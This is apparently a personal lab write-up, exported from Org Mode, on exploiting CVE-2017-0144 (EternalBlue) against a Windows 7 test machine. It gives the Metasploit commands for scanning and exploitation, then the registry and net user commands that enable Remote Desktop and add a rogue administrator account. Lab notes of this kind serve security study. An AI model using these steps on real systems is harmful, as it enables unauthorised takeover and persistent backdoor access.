<!DOCTYPE html>
<html lang="en">
<head>
<!-- 2023-02-02 Thu 21:55 -->
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CVE-2017-0144</title>
<meta name="author" content="Honbey Zhang" />
<meta name="generator" content="Org Mode" />

                     <!--
                     <link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
                     -->
                     <!--
                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/htmlize.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/bigblow.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/hideshow.css" type="text/css"/>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-1.11.0.min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-ui-1.10.2.min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.localscroll-min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.scrollTo-1.4.3.1-min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.zclip.min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/bigblow.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/hideshow.js"></script>
                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
                     -->
                     <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/htmlize.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/readtheorg.css" type="text/css"/>
                     <script type="text/javascript" src="../resources/src/lib/js/jquery.min.js"></script>
                     <script type="text/javascript" src="../resources/src/lib/js/bootstrap.min.js"></script>
                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
                     <script type="text/javascript" src="../resources/src/readtheorg_theme/js/readtheorg.js"></script>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">CVE-2017-0144</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#org9861b14">Introduction - Eternal Blue</a>
<ul>
<li><a href="#org34f393b">步骤</a></li>
<li><a href="#org5bd6bf7">Tips</a></li>
<li><a href="#org7024046">参考链接</a></li>
</ul>
</li>
</ul>
</div>
</nav>

<div id="outline-container-org9861b14" class="outline-2">
<h2 id="org9861b14">Introduction - Eternal Blue</h2>
<div class="outline-text-2" id="text-org9861b14">
<p>
利用 Metasploit 中针对 ms17-101 漏洞的攻击载荷进行攻击获取主机控制权限。“永恒之蓝”的原理主要是扫描所有开放 445 文件共享端口的 Windows 机器。445 端口可以在局域网中轻松访问各种共享文件夹或共享打印机。
</p>

<ul class="org-ul">
<li>Tool: Kali Rolling x64</li>
<li>Target Machine: Windows 7 Ultimate x64</li>
</ul>
</div>

<div id="outline-container-org34f393b" class="outline-3">
<h3 id="org34f393b">步骤</h3>
<div class="outline-text-3" id="text-org34f393b">
<ol class="org-ol">
<li><p>
Bash
</p>
<div class="org-src-container">
<pre class="src src-bash">nmap -r 10.20.20.0/28 # search target (optional)
msfconsole
</pre>
</div></li>

<li><p>
msfconsole
</p>
<div class="org-src-container">
<pre class="src src-bash">search ms17_010
use auxiliary/scanner/smb/smb_ms17_010
set rhosts 10.20.20.7
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 10.20.20.7
run # exploit
</pre>
</div></li>

<li><p>
meterpreter
</p>
<div class="org-src-container">
<pre class="src src-bash">#if it not enter CMD automatically, input the below command in meterpreter
shell
</pre>
</div></li>

<li><p>
CMD
</p>
<div class="org-src-container">
<pre class="src src-cmd">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
net user USERNAME PASSWORD /add
net localgroup administrators USERNAME /add
</pre>
</div></li>

<li><p>
Bash
</p>
<div class="org-src-container">
<pre class="src src-bash">rdesktop 10.20.20.7:3389
# then input the USERNAME and PASSWORD you had created
# now you can control the target machine
</pre>
</div></li>
</ol>
</div>
</div>

<div id="outline-container-org5bd6bf7" class="outline-3">
<h3 id="org5bd6bf7">Tips</h3>
<div class="outline-text-3" id="text-org5bd6bf7">
<p>
The Below OS version may cause Blue Screen and cannot use successfully:
</p>
<ul class="org-ul">
<li>Windows 7 Home x86</li>
<li>Windows 7 Professional x86</li>
<li>Windows 7 Enterprise x86</li>
</ul>

<p>
It&rsquo;s likly the 32-bit OS of Windows 7 as the same case, but we can attack successfully on XP SP3(32-bit).
</p>
</div>
</div>

<div id="outline-container-org7024046" class="outline-3">
<h3 id="org7024046">参考链接</h3>
<div class="outline-text-3" id="text-org7024046">
<ol class="org-ol">
<li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144">cve.mitre.org</a></li>
</ol>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">

                     Theme
                     <a href="https://github.com/fniessen/org-html-themes" target="_blank">bigblow/readtheorg</a>
                     by
                     <a href="https://github.com/fniessen" target="_blank">fniessen</a>
                     <br>
                     <a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
</div>
</body>
</html>